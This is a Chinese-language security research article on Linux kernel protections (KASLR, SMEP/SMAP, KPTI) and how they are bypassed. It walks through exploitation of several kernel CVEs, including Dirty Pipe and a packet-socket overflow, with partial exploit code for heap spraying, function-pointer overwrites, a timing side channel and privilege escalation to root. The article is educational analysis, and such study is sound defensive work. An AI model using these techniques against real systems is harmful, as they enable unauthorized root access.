**作者：天融信阿尔法实验室  
原文链接：<https://mp.weixin.qq.com/s/rQV81nAsIhkBgiOZA0_01A>**

### 一、内核是什么？

内核是操作系统的核心部分。内核负责管理计算机的硬件资源，并实现操作系统的基本功能。内核是操作系统中最重要的部分，它是操作系统与硬件之间的桥梁。内核可以被看作是操作系统的“心脏”，负责控制和管理计算机系统的所有硬件和软件资源。不同的操作系统有不同的内核，比如Linux操作系统有Linux内核，Linux内核是Linux操作系统的核心部分，它是由C语言编写的程序，并且是一个开源软件，它的源代码可以自由下载和修改。Linux内核提供了多种功能，包括内存管理、进程管理、文件系统支持、网络通信等，Linux内核的设计具有高度的可扩展性和灵活性，可以应对各种应用场景和硬件平台。

### 二、内核漏洞

有代码就有漏洞，内核也不例外。内核漏洞是操作系统内核中的存在的安全漏洞，这些漏洞可能导致系统被恶意软件入侵或攻击者控制，并可能造成数据泄露、系统瘫痪等严重后果。例如：攻击者可能会利用内核漏洞来绕过系统安全保护，提升权限，从而获取用户敏感信息，或者在系统中安装恶意软件，损坏系统数据或瘫痪整个系统。著名漏洞“dirty
cow”(脏牛漏洞)影响之广，从2007年到2018年之间的所有发行版都受其影响，让全世界数百万台设备暴露在威胁当中。

![image](https://images.seebug.org/content/images/2023/02/21/1676958885000-Picture1.png-w331s)

如图为近10年漏洞报送数量，表中可知Linux内核漏洞数量一直处于高位，基本每年在100以上，尤其2017年漏洞数量最多，达到449个之多。

因此及时发现，修复内核漏洞非常重要。通常，操作系统厂商会定期发布补丁来修复内核漏洞。同时为了减小漏洞发现造成的危害，Linux内核采用了多种技术来提高漏洞利用的难度来保护系统安全。例如：SMEP保护、SMAP保护、KASLR保护、KPTI保护。但即使是这么多保护，也无法安全保护内核，漏洞可以轻松绕过这些保护，达到提权效果。下面介绍这些年出现Linux内核保护技术以及针对这些保护技术的绕过方法。

### 三、Linux内核保护与绕过

#### 1、KASLR 保护

linux内核（2005年）开始支持KASLR。KASLR（Kernel Address Space Layout
Randomization）是一种用于保护操作系统内核的安全技术。它通过在系统启动时随机化内核地址空间的布局来防止攻击者确定内核中的精确地址。即使攻击者知道了一些内核代码的位置，也无法精确定位内核中的其他代码和数据，从而绕过系统安全保护。在实现时主要通过改变原先固定的内存布局来提升内核安全性，因此在代码实现过程中，kaslr与内存功能存在比较强的耦合关系。

随机化公式： 函数基地址 +随机值=内存运行地址

比如先查看 entry_SYSCALL_64函数的基地址为 0xffffffff82000000

![entry_SYSCALL_64](https://images.seebug.org/content/images/2023/02/21/1676958885000-entry_SYSCALL_64_base.png-w331s)

它运行时的内存地址为0xffffffff8fa00000

![entry_SYSCALL_64](https://images.seebug.org/content/images/2023/02/21/1676958885000-entry_SYSCALL_64_addr.png-w331s)

将运行地址减函数基地址得到随机值变量0xda00000(0xffffffff8fa00000-0xffffffff82000000=0xda00000)
，这0xda0000就是随机值，每次系统启动的时候都会发生变化。

在有kaslr保护的情况下，漏洞触发要跳转到指定的函数位置时，由于随机值的存在，无法确定函数在内存中的具体位置，如果要利用就需要预先知道目标函数地址以及shellcode存放在内存中的地址，这使得漏洞利用比较困难。

针对这种保护技术，目前比较常规的绕过方法是利用漏洞泄露出内核中某些结构体，通过上面计算方法算出内核基地址,有了基地址后就可以计算想要的函数地址了。

如CVE-2022-0185，是一个提权漏洞,漏洞成因是 len > PAGE-2-size 整数溢出导致判断错误，后面继续拷贝造成堆溢出。

    
    
    diff --git a/fs/fs_context.c b/fs/fs_context.c
    index b7e43a780a625..24ce12f0db32e 100644
    --- a/fs/fs_context.c
    +++ b/fs/fs_context.c
    @@ -548,7 +548,7 @@ static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
                      param->key);
        }
    
    -   if (len > PAGE_SIZE - 2 - size)     //这里存在整数溢出，后面的拷贝会造成堆溢出
    +   if (size + len + 2 > PAGE_SIZE)
            return invalf(fc, "VFS: Legacy: Cumulative options too large");
        if (strchr(param->key, ',') ||
            (param->type == fs_value_is_string &&  

函数调用路径：_x64_sys_fsconfig() --->
vfs_fsconfig_locked()-->vfs_parse_fs_param()-->legacy_parse_param()，vfs_parse_fs_param()中的函数指针定义在legacy_fs_context_ops函数表中，在alloc_fs_context()函数中完成filesystem
context结构的分配和初始化。

在legacy_parse_param 函数：linux5.11/fs/fs_context.c: legacy_parse_param

    
    
    static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
    {
       struct legacy_fs_context *ctx = fc->fs_private;
       unsigned int size = ctx->data_size;
       size_t len = 0;
    
       ··· ···
       ··· ···
       switch (param->type) {
       case fs_value_is_string:
        len = 1 + param->size;
        fallthrough;
       ··· ···
       }
    
       if (len > PAGE_SIZE - 2 - size) //--此处边界检查有问题
        return invalf(fc, "VFS: Legacy: Cumulative options too large");
       if (strchr(param->key, ',') ||
           (param->type == fs_value_is_string &&
            memchr(param->string, ',', param->size)))
        return invalf(fc, "VFS: Legacy: Option '%s' contained comma",
               param->key);
       if (!ctx->legacy_data) {
        ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL); //在第一次时会分配一页大小
        if (!ctx->legacy_data)
         return -ENOMEM;
       }
    
       ctx->legacy_data[size++] = ',';
       len = strlen(param->key);
       memcpy(ctx->legacy_data + size, param->key, len);
       size += len;
       if (param->type == fs_value_is_string) {
        ctx->legacy_data[size++] = '=';
        memcpy(ctx->legacy_data + size, param->string, param->size); //拷贝，存在越界
        size += param->size;
       }
       ctx->legacy_data[size] = '\0';
       ctx->data_size = size;
       ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
       return 0;
    }

(len > PAGE_SIZE - 2 - size )判断处有问题，根据符号优先级 `"-"`的优先级是4，`">"`
的优先级是6，所以先执行右边模块。又因为数据类型自动转换原则，`"PAGE_SIZE-2-size"`
转换为无符号进行运算。size变量由用户空间传入，当size的值大于“PAGE_SIZE-2”的差值时，运算产生溢出。后面拷贝时，size是大于kmalloc申请的“PAGE_SIZE
- 2”大小。在memcpy(ctx->legacy_data + size, param->string, param->size);
这个位置，导致溢出。

legacy_parse_param函数是处理文件系统挂载过程中的一些功能，所以对这个漏洞的利用，不同磁盘格式利用方式也不一样，这里我们在ext4磁盘格式下，了解一下其漏洞利用过程。首先fsopen打开一个文件系统环境，用户可以用来mount新的文件系统。
fsconfig()调用能让我们往
ctx->legacy_data写入一个新的(key,valu),ctx->legacy_data指向一个4096字节的缓冲区（首次配置文件系统时就分配）。
len > PAGE_SIZE-2-size , len是将要写的长度，PAGE_SIZE == 4096,
size是已写的长度，2字节表示一个逗号和一个NULL终止符。当size是unsigned
int（总是被当作正值），会导致整数溢出，如果相减的结果小于0，还是被包装成正值。执行117次后添加长度为0的key和长度为33的value，最终的size则为（117*（33+2））==4095，这样PAGE_SIZE-2-size==-1==18446744073709551615
,这样无论len多大都能满足条件。可以设置为"\x00",这样逗号会写入偏移4095，等号写入下给kmalloc-4096d
偏移0处，接着就能往偏移1处开始往后写value。

针对这个漏洞，我们可以利用seq_operations结构体泄露内核基地址从而绕过KASLR，seq_operations
是一个大小为0x20的结构体，在打开/proc/self/stat会申请出来。里面定义了四个函数指针，通过他们可以泄露出内核基地址。

    
    
    struct seq_operations {
     void * (*start) (struct seq_file *m, loff_t *pos);
     void (*stop) (struct seq_file *m, void *v);
     void * (*next) (struct seq_file *m, void *v, loff_t *pos);
     int (*show) (struct seq_file *m, void *v);
    };

利用seq_operations泄露内核基地址：堆喷大量 seq_operations (open("/proc/self/stat",O_RDONLY))
,溢出篡改msg_msg->m_ts的值，从而泄露基地址。

  * 准备 fs_context 漏洞对象；

    
    
    int call_fsopen(){
        int fd = fsopen("ext4",0);
        if(fd <0){
            perror("fsopen");
            exit(-1);
        }
        return fd;
    }

  * 往kmalloc-32堆喷seq_operations对象；

    
    
        for(int i=0;i<100;i++){
            open("/proc/self/stat",O_RDONLY);
        }

  * 创建大量msg_msg消息(大小为0xfe8)，会将辅助消息分配在kmalloc-32
  * 触发kmalloc-4096溢出，修改msg_msg->m_ts;

    
    
        char tiny_evil[] = "DDDDDD\x60\x10";
        fsconfig(fd,FSCONFIG_SET_STRING,"CCCCCCCC",tiny,0);
        fsconfig(fd,FSCONFIG_SET_STRING,"\x00",tiny_evil,0);

  * 利用msg_msg越界读，泄露内核指针。

    
    
        get_msg(targets[i],received,size,0,IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        printf("[*] received 0x%lx\n", kbase);

泄露出基地址后，可根据偏移计算任何内核函数地址达到提权。

#### 2、SMEP&SMAP保护

linux内核从3.0（2011年8月）开始支持SMEP，3.7（2012年12月）开始支持SMAP。SMEP（Supervisor Mode
Execution
Protection）是一种用于保护操作系统内核安全的技术。它通过在CPU开一个比特位，来限制内核态访问用户态的代码。当有了内核的控制权去执行用户态中的shellcode，CPU会拒绝执行该操作，并向操作系统发出一个异常中断。这样，即使攻击者成功执行了恶意代码，也无法绕过系统安全保护访问，从而大大增强了系统的安全性。根据CR4寄存器的值判断是否开启smep保护，当CR4寄存器的第20位是1时，保护开启，为0时，保护关闭。

![image](https://images.seebug.org/content/images/2023/02/21/1676958885000-Picture2_SMEP.png-w331s)

SMAP（Supervisor Mode Access
Protection）是一种用于保护操作系统内核的安全技术。它与SMEP相似，都在CPU中开启一个比特位来限制内核态访问用户态的能力。它使用户态的指针无法被内核态解引用。这样即使攻击者成功执行了恶意代码，也无法绕过系统安全保护读取内核空间中的敏感信息。判断CR4寄存器的值来确定是否开启，当CR4寄存器的值第21位是1时，SMAP开启。

![image1](https://images.seebug.org/content/images/2023/02/21/1676958885000-Picture2_SMAP.png-w331s)

针对SMEP、SMAP保护时，一般是通过漏洞修改寄存器关闭保护，达到绕过保护的目的。比如可以通过获得内核基地址后算出native_write_cr4函数在内存运行时地址,控制PC跳转到native_write_cr4函数去覆写CR4寄存器的20位和21位关闭保护，CPU只是判断CR4寄存器的20位21位的值，只要为0零就能关闭保护，同样也可以使用ROP的方式在内核镜像中寻找ROP组合出能修改cr4寄存器的链。

CVE-2017-7308漏洞，是内核套接字中的packet_set_ring()函数没有正确检测size,长度判断条件错误，导致堆溢出。

    
    
    static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
      int closing, int tx_ring){
        ...
        if (po->tp_version >= TPACKET_V3 &&
                    (int)(req->tp_block_size -                      BLK_PLUS_PRIV(req_u->req3.tp_sizeof_priv)) <= 0)
                    goto out;
      ...   
    }

判断内存块头部加上每个内存块私有数据的大小不超过内存块自身的大小，保证内存中有足够的空间。当req_u->req3.tp_sizeof_priv
接近unsigned int 的最大值时，这个判断就会被绕过。随后代码执行到init_prb_bdqc函数处创建环形缓冲区。

    
    
    static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
      int closing, int tx_ring){
    
        ...
            order = get_order(req->tp_block_size); // 内核页的阶
      pg_vec = alloc_pg_vec(req, order); // 在某个阶上取一页
      if (unlikely(!pg_vec))
       goto out;
         // 创建一个接收数据包的TPACKET_V3环形缓冲区。 
      switch (po->tp_version) {
       case TPACKET_V3:
                /* Transmit path is not supported. We checked
                 * it above but just being paranoid
                 */
       if (!tx_ring)
        init_prb_bdqc(po, rb, pg_vec, req_u);
               break;
      default:
       break;
        ...
    }

在init_prb_bdqc函数中，req_u->req3.tp_sizeof_priv（unsigned
int）赋值给了p1->blk_sizeof_priv（unsigned
short），被分割成低位字节。因为tp_sizeof_priv可控，所以blk_sizeof_priv也可控。

    
    
    static void init_prb_bdqc(struct packet_sock *po,
       struct packet_ring_buffer *rb,
       struct pgv *pg_vec,
       union tpacket_req_u *req_u)
    {
     struct tpacket_kbdq_core *p1 = GET_PBDQC_FROM_RB(rb);
     struct tpacket_block_desc *pbd;
     ...
     p1->blk_sizeof_priv = req_u->req3.tp_sizeof_priv;
     p1->max_frame_len = p1->kblk_size - BLK_PLUS_PRIV(p1->blk_sizeof_priv); 
     prb_init_ft_ops(p1, req_u);
     prb_setup_retire_blk_timer(po);
     prb_open_block(p1, pbd); //初始化第一个内存块
    }

因为blk_sizeof_priv可控，进而可以间接控制max_frame_len的值，该值是最大帧范围，控制max_frame_len的值超过实际帧大小，当内核接收数据包即可绕大小检测。

    
    
    static void prb_open_block(struct tpacket_kbdq_core *pkc1,
     struct tpacket_block_desc *pbd1)
    {
     struct timespec ts;
     struct tpacket_hdr_v1 *h1 = &pbd1->hdr.bh1;
     ...
     pkc1->pkblk_start = (char *)pbd1;          
     pkc1->nxt_offset = pkc1->pkblk_start + BLK_PLUS_PRIV(pkc1->blk_sizeof_priv);
     BLOCK_O2FP(pbd1) = (__u32)BLK_PLUS_PRIV(pkc1->blk_sizeof_priv);  
     BLOCK_O2PRIV(pbd1) = BLK_HDR_LEN;
     ...
    }

nxt_offset是写入内存块的偏移量。通过pkc1->blk_sizeof_priv间接控nxt_offset。从packet_set_ring函数绕过检测开始，后面的最大值以及写入偏移都可控，所以可以利用溢出修改SMEP和SMAP保护。

利用思路首先创建一个环形缓冲区，再在某个环形缓冲区内存后面分配一个packet_sock对象，将接收环形缓冲区附加到packet_sock对象，溢出它，覆盖prb_bdqc->retire_blk_timer字段，使得retire_blk_timer->func指向native_write_cr4函数，retire_blk_timer->data
设置覆盖值，等待计时器执行func后关闭SMEP和SMAP。native_write_cr4函数是内核4.x版本的内置inline汇编函数，主要用来修改CR4寄存器的。

![native_write_cr4](https://images.seebug.org/content/images/2023/02/21/1676958886000-native_write_cr4.png-w331s)

堆分配512个 socket对象

    
    
    void kmalloc_pad(int count) {
    
        for(int i=0;i<512;i++){
            if(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP))==-1)
                printf("[-] socket err\n");
                exit(-1);
        }
    }

页分配1024个页

    
    
    void pagealloc_pad(int count){
       packet_socket(0x8000,2048,count,0,100);
    }
    
    int packet_socket(unsigned int block_size, unsigned int frame_size,
        unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
       int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
       if (s < 0) {
        printf("[-] socket err\n");
        exit(-1);
       }
    
       packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
        sizeof_priv, timeout);
    
       struct sockaddr_ll sa;
       memset(&sa, 0, sizeof(sa));
       sa.sll_family = PF_PACKET;
       sa.sll_protocol = htons(ETH_P_ALL);
       sa.sll_ifindex = if_nametoindex("lo"); //网络接口
       sa.sll_hatype = 0;
       sa.sll_pkttype = 0;
       sa.sll_halen = 0;
    
       int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
       if (rv < 0) {
        printf("[-] bind err\n");
        exit(-1);
       }
    
       return s;
    }
    
    void packet_socket_rx_ring_init(int s, unsigned int block_size,
        unsigned int frame_size, unsigned int block_nr,
        unsigned int sizeof_priv, unsigned int timeout) {
       int v = TPACKET_V3;
       int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
       if (rv < 0) {
        printf("[-] setsockopt err\n");
        exit(-1);
       }
    
       struct tpacket_req3 req;
       memset(&req, 0, sizeof(req));
       req.tp_block_size = block_size;  
       req.tp_frame_size = frame_size;
       req.tp_block_nr = block_nr;
       req.tp_frame_nr = (block_size * block_nr) / frame_size;
       req.tp_retire_blk_tov = timeout;
       req.tp_sizeof_priv = sizeof_priv; 
       req.tp_feature_req_word = 0;
    
       // 创建PACKET_RX_RING 的环形缓冲区
       rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
       if (rv < 0) {
        printf("[-] setsockopt err\n");
        exit(-1);
       }
    }

执行关闭SMEP和SMAP保护

    
    
    void oob_timer_execute(void *func, unsigned long arg) {
        // 构造溢出堆
     oob_setup(2048 + TIMER_OFFSET - 8);
    
     int i;
     for (i = 0; i < 32; i++) {
            // 环形缓冲区后面创建 packet_sockt 对象
      int timer = packet_sock_kmalloc();
            // 附加到packet_sockt对象后面，设置计时器时间
      packet_sock_timer_schedule(timer, 1000);
     }
    
     char buffer[2048];
     memset(&buffer[0], 0, sizeof(buffer));
    
     struct timer_list *timer = (struct timer_list *)&buffer[8];
     timer->function = func;  // 为 native_write_cr4  函数地址
     timer->data = arg;
     timer->flags = 1;
    
        // 发送数据包到接收环形缓冲区上，溢出环形缓冲区的retire_blk_timer->func，并等待计时器执行
     oob_write(&buffer[0] + 2, sizeof(*timer) + 8 - 2);
    
     sleep(1);
    }
    
    // 为了构造堆溢出，计算到 retire_blk_timer 的偏移值
    int oob_setup(int offset) {
     unsigned int maclen = ETH_HDR_LEN;
     unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +
        (maclen < 16 ? 16 : maclen));
     unsigned int macoff = netoff - maclen;
     unsigned int sizeof_priv = (1u<<31) + (1u<<30) +
      0x8000 - BLK_HDR_LEN - macoff + offset;
     return packet_socket_setup(0x8000, 2048, 2, sizeof_priv, 100);
    }

溢出xmit字段，指向用户空间的申请的commit_creds(prepare_kernel_cred(0)) 函数获得root。

    
    
    void oob_id_match_execute(void *func) {
        // 创建环形缓冲区构造堆溢出，计算packet_sock->xmit的偏移
     oob_setup(2048 + XMIT_OFFSET - 64);
    
     int ps[32];
    
     int i;
     for (i = 0; i < 32; i++)
      ps[i] = packet_sock_kmalloc(); //创建 packet_sockt 对象
    
     char buffer[2048];
     memset(&buffer[0], 0, 2048);
    
     void **xmit = (void **)&buffer[64]; 
     *xmit = func; // 用户空间的commit_creds(prepare_kernel_cred(0))函数
    
        // 溢出写入packet_sock->xmit处
     oob_write((char *)&buffer[0] + 2, sizeof(*xmit) + 64 - 2);
    
     for (i = 0; i < 32; i++)
      packet_sock_id_match_trigger(ps[i]); // 发送数据包到 packet_sockt对象上，执行xmit
    }

#### 3、KPTI保护

linux内核从4.15（2018年-2月）开始支持KPTI。KPTI（kernel page-table isolation,
内核页表隔离，也称PTI）是Linux内核中的一种强化技术，旨在更好地隔离用户空间与内核空间的内存来提高安全性，缓解现代x86
CPU中的“熔毁”硬件安全缺陷。KPTI通过完全分离用户空间与内核空间页表来解决页表泄露。一旦开启了 KPTI,由于内核态和用户态的页表不同，所以如果使用
ret2user或内核执行 ROP返回用户态时，由于内核态无法确定用户态的页表，就会报出一个段错误。

针对这种保护方式，主流是通过signal函数和KPTI
trampoline方法，近段时间一个新的思路，通过侧信道泄露内存地址，从而绕过KPTI保护，执行指定代码。

CVE-2022-4543
漏洞绕过带有KPTI的保护，通过预取侧信道找到entry_SYSCALL_64的地址，并且它与`__entry_text_start`和其他部分一起随机化。思路是重复多次执行系统调用以确保页上有缓存指令在TLB中，然后预取侧信道处理程序的可能选定范围（如0xffffffff80000000-0xffffffffc0000000）。TLB（
虚拟到物理地址转换的缓存机制）。x86_64有一组预取指令RDTSC，这些指令将地址“预取”到 CPU 缓存中。如果正在加载的地址已存在于 TLB
中，则预取将快速完成，但当地址不存在时，预取将完成得较慢（并且需要完成页表遍历）。

    
    
    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
        {
            for (uint64_t idx = 0; idx < ARR_SIZE; idx++)
            {
                uint64_t test = SCAN_START + idx * STEP;
                syscall(104);   // 多次调用，确保缓存指令在TLB中
                uint64_t time = sidechannel(test);  // 预取
                if (i >= DUMMY_ITERATIONS)
                    data[idx] += time;
            }
        }
    
    uint64_t sidechannel(uint64_t addr) {
      uint64_t a, b, c, d;
      asm volatile (".intel_syntax noprefix;"
        "mfence;"
        "rdtscp;"
        "mov %0, rax;"
        "mov %1, rdx;"
        "xor rax, rax;"
        "lfence;"
        "prefetchnta qword ptr [%4];"
        "prefetcht2 qword ptr [%4];"
        "xor rax, rax;"
        "lfence;"
        "rdtscp;"
        "mov %2, rax;"
        "mov %3, rdx;"
        "mfence;"
        ".att_syntax;"
        : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
        : "r" (addr)
        : "rax", "rbx", "rcx", "rdx");
      a = (b << 32) | a;
      c = (d << 32) | c;
      return c - a;
    }

普通用户权限侧信道绕过带有给KPTI保护。

![CVE-2022-4543](https://images.seebug.org/content/images/2023/02/21/1676958886000-CVE-2022-4543.png-w331s)

### 四、新内核漏洞利用方法

由于内核保护的手段日益增多，传统的漏洞利用方法也越来越困难，所以安全研究者在研究一些新的漏洞利用方法。新的利用方法可以不关注上面的保护，如果漏洞品相好可以直接绕过保护达到内核任意地址读写。如：CVE-2022-0847
它因splice函数映射文件时没有重置pipe中的flag标志，导致缓存页越权写入内容,利用该漏洞可在root权限文件中写入提权脚本。

#### 1、pipe管道技术

前置知识：pipe管道Linux内核中，管道本质是创建一个 **虚拟的inode** （即创建一个虚拟文件节点）来表示，其中在节点上描述管道信息的结构体为
**pipe_inode_info** (inode->i_pipe). 其中包含一个管道的所有信息。当创建一个管道时，内核会创建 **VFS
inode** ， **pipe_inode_info** 结构体、两个文件描述符（代表着管道的两端）、 **pipe_buffer**
结构体数组。管道原理的示意图列。

![pipe](https://images.seebug.org/content/images/2023/02/21/1676958886000-pipe.png-w331s)

用来表示管道中数据的是一个 **pipe_buffer** 结构数组，单个 **pipe_buffer** 结构体用来表示管道中单张内存页的数据：

    
    
    /**
     *  struct pipe_buffer - a linux kernel pipe buffer
     *  @page: 管道缓冲区存放了数据的页
     *  @offset: 在@page中数据的偏移
     *  @len: 在@page中数据的长度
     *  @ops: 该buffer的函数表，参见@pipe_buf_operations.
     *  @flags: 管道缓冲区的标志位，
     *  @private: 函数表的私有数据
     **/
    struct pipe_buffer {
        struct page *page;
        unsigned int offset, len;
        const struct pipe_buf_operations *ops;
        unsigned int flags;
        unsigned long private;
    };

有两个系统调用可以创建管道，pipe、pipe2.这两个系统调用最终都会调到 do_pipe2()函数。

![pipe_source](https://images.seebug.org/content/images/2023/02/21/1676958886000-pipe_source.png-w331s)

存在如下调用链：

    
    
    do_pipe2()
        __do_pipe_flags()
            create_pipe_files()
                get_pipe_inode()
                    alloc_pipe_info()

最终调用 kcalloc()分配一个 pipe_buffer数组，默认数量为 PIPE_DEF_BUFFERS（16）.
即一个管道初始默认可以存放16张页面的数据.

pipe_inode_info创建:

    
    
    struct pipe_inode_info *alloc_pipe_info(void)
    {
        struct pipe_inode_info *pipe;
        unsigned long pipe_bufs = PIPE_DEF_BUFFERS; // 这个是 16
        struct user_struct *user = get_current_user();
        unsigned long user_bufs;
        unsigned int max_size = READ_ONCE(pipe_max_size);
    
        pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);
    
        //...
    
        pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),
                     GFP_KERNEL_ACCOUNT);

pipe链接到 inode节点上

    
    
    static struct inode * get_pipe_inode(void)
    {
        struct inode *inode = new_inode_pseudo(pipe_mnt->mnt_sb);
        struct pipe_inode_info *pipe;
    
        ...
    
        pipe = alloc_pipe_info();   //创建 pipe
        if (!pipe)
            goto fail_iput;
    
        inode->i_pipe = pipe;       // pipe 链接到 inode节点上
    
        ...

示意图：

![img](https://images.seebug.org/content/images/2023/02/21/1676958886000-img.png-w331s)

管道的本体是 pipe_inode_info 结构体，其管理
pipe_buffer数组的方式本质上是一个循环队列，其head成员标识队列头的idx、tail成员表示队列尾的idx，头进尾出.

管道的写入过程

查表pipefifo_fops可知当向管道写入数据时，会调用到pipe_write函数。流程如下：

  * 若感到非空且上一个buf未满，则先尝试向上一个被写入的buffer写入数据（若该buffer设置了 **PIPE_BUF_FLAG_CAN_MERGE** 标志位）
  * 接下来开始对新的buffer进行数据写入，若没有 **PIPE_BUF_FLAG_CAN_MERGE** 标志位则分配新页面后写入
  * 循环第二步直到完成写入，若管道满了则会尝试唤醒read读取让管道腾出空间。

这里可知 **PIPE_BUF_FLAG_CAN_MERGE** 用以标识一个 **pipe_buffer**
是否已经分配了可以写入的空间。在大循环中若对于 **pipe_buffer** 没有设置该 **flag**
（刚被初始化），则会新分配一个页面供写入，并设置该表示位。

管道的读出过程

查表管道读出数据时调用 pipe_read,主要是读取buffer对应的page上的数据，若一个buffer被读完了则将其出列。

对于一个刚刚建立的管道，其 buffer 数组其实并没有分配对应的页面空间，也没有设置标志位；在我们向管道内写入数据时会通过 buddy system
为对应 buffer 分配新的页框， **并设置 PIPE_BUF_FLAG_CAN_MERGE 标志位，标志该 buffer 可以进行写入**
；而当我们从管道中读出数据之后，纵使一个 buffer 对应的 page 上的数据被读完了，我们也不会释放该 page，而是会直接投入到下一次使用中，
**因此会保留 PIPE_BUF_FLAG_CAN_MERGE 标志位。**

写入时会设置 **PIPE_BUF_FLAG_CAN_MERGE 标志位。** 读出时会保留 **PIPE_BUF_FLAG_CAN_MERGE
标志位。**

splice：文件与管道间数据拷贝

当我们想要将一个文件的数据拷贝到另一个文件时，比较朴素的一种想法是打开两个文件后将源文件数据读入后再写入目标文件，但这样的做法需要在用户空间与内核空间之间来回进行数据拷贝，
**具有可观的开销。**

因此为了减少这样的开销， splice这一个非常独特的系统调用应运而生，其作用是 **在文件与管道之间进行数据拷贝** ，以此
**将内核空间与用户空间之间的数据拷贝转变为内核空间内的数据拷贝，从而避免了数据在用户空间与内核空间之间的拷贝造成的开销。**
当你想要将数据从一个文件描述符拷贝到另一个文件描述符中，只需要先创建一个管道，之后使用 splice 系统调用将数据从源文件描述符拷贝到管道中、再使用
splice 系统调用将数据从管道中拷贝到目的文件描述符即可。这样的设计使得我们只需要两次系统调用便能完成数据在不同文件描述符间的拷贝工作，且
**数据的拷贝都在内核空间中完成，极大地减少了开销。**

漏洞利用

写、读管道，设置 PIPE_BUF_FLAG_CAN_MERGE flag， **将管道写满后再将所有数据读出** ，这样管道的每一个
pipe_buffer 都会被设置上 PIPE_BUF_FLAG_CAN_MERGE 标志位

    
    
        pipe(pipe_fd);
        pipe_size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
        buffer = (char*) malloc(page_size);
        for (int i = pipe_size; i > 0; )
        {
            if (i > page_size)
                write_size = page_size;
            else
                write_size = i;
            i -= write(pipe_fd[1], buffer, write_size);
        }
    
        for (int i = pipe_size; i > 0; )
        {
           if(i>page_size)
                read_size = page_size ;
           else
               read_size = i;
            i -= read(pipe_fd[0], buffer, read_size);
        }

调用splice 函数建立 pipe_buffer 与文件的关联（漏洞产生点）使用 splice 系统调用将数据从文件中读入到管道，为了让
pipe_buffer->page 其中一个页替换为文件内存映射页。

    
    
    splice(file_fd, &offset_from_file, pipe_fd[1], NULL, 1, 0);

向管道中写入恶意数据，完成越权写入文件， splice
函数使内核中管道建立完页面映射后，head指针会指向下一个pipe_buffer,此时我们再向管道中写入数据，管道计数器会发现上一个 pipe_buffer
没有写满，从而 **将数据拷贝到上一个 pipe_buffer 对应的页面——即文件映射的页面** ，由于 PIPE_BUF_FLAG_CAN_MERGE
仍保留着，因此 **内核会误以为该页面可以被写入** ，从而完成了越权写入文件的操作。

    
    
    write(pipe_fd[1], file_fd, data_size);

漏洞测试效果：

![permissinfile](https://images.seebug.org/content/images/2023/02/21/1676958886000-permissinfile.png-w331s)

flag文件只有读权限没有写权限，使用CVE-2022-0847向这个文件写入内容。

![CVE-2022-0847](https://images.seebug.org/content/images/2023/02/21/1676958886000-CVE-2022-0847.png-w331s)

成功向flag写入内容。在实现情况中，向有root权限的脚本中写入提权代码，触发执行即可获得root权限，该方法可减少内核函数地址计算以及安全保护的绕过。

#### 2、kernel5.x版本和kernel4.x版本的不同

在kernel
4.x版本中常用的绕过保护方式,漏洞利用成功控制PC后跳转到native_write_cr4函数关闭SMEP、SMAP保护，使之后部署和执行shellcode提权更为便捷。

![native_write_cr4](https://images.seebug.org/content/images/2023/02/21/1676958886000-native_write_cr4.png-w331s)

但是在kernel 5.x版本中native_write_cr4函数被添加了commit
增加了对CR4寄存器的判断，如检测到了修改就还原CR4寄存器的值，不在是之前那种简单的汇编形式了，像以前一样简单调用函数关闭SMEP和SMAP将不在可行。

![native_write_cr4](https://images.seebug.org/content/images/2023/02/21/1676958886000-native_write_cr4_5.x.png-w331s)

现在较为常用的技术是利用漏洞修改常量modprobe_path 的字符串地址，

![modprobe_path](https://images.seebug.org/content/images/2023/02/21/1676958887000-modprobe_path.png-w331s)

modprobe_path是用于在Linux内核中添加可加载的内核模块，当我们在Linux内核中安装或卸载新模块时，就会执行这个程序。而当内核运行一个错误格式的文件（或未知文件类型的文件）的时候，也会调用这个
modprobe_path所指向的程序。如果我们将这个字符串指向我们自己的sh文件 ，并使用 system或 execve
去执行一个未知文件类型的错误文件，那么在发生错误的时候就可以执行我们自己的二进制文件了。同样的有了新的利用方法也会出现相对应的保护方法。

### 五、总结

内核保护和利用是一个长期对抗的过程，出现了新的利用方法相应的也会出现新的对抗手段。
安全防护并不能完全保证内核是安全的，一旦有危害性更高的漏洞出现，就很容易打破这些保护使其轻易的获取系统权限。安全不能仅仅依靠这些保护机制，应要时常关注漏洞报送信息或安全邮件组里讨论的安全事件，及时更新安全补丁。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/2050/>

